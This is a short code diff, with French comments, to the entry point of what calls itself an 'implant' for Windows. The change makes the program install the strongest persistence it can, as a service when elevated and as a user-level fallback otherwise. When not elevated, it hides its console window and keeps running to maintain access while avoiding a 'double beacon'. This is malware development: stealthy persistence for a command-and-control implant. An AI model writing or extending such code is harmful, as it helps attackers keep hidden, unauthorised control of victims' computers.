@@ -16,15 +16,17 @@ int main(int argc, char** argv) {
     if (res == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
         // 2. Si on n'est pas lance par le SCM :
 #ifdef NDEBUG
-        // En Release : on tente d'installer et de demarrer le service Windows.
-        // Si l'installation reussit, le processus d'installation quitte pour
-        // laisser le service tourner seul en arriere-plan (evite le double beacon).
-        if (install_persistence()) {
+        // En Release : on installe la persistance la plus forte possible.
+        // Si elle est elevee, le service prend le relais et ce processus quitte
+        // (evite le double beacon). Sinon, le repli utilisateur est installe et
+        // l'implant tourne ici, masque, jusqu'au prochain logon.
+        const bool elevated = process_is_elevated();
+        const bool installed = install_persistence();
+
+        if (installed && elevated) {
             return 0;
         }
 
-        // Si l'installation a echoue (ex: non-admin), on tourne directement
-        // en console masquee pour maintenir l'acces.
         ShowWindow(GetConsoleWindow(), SW_HIDE);
         start_implant();
         return 0;
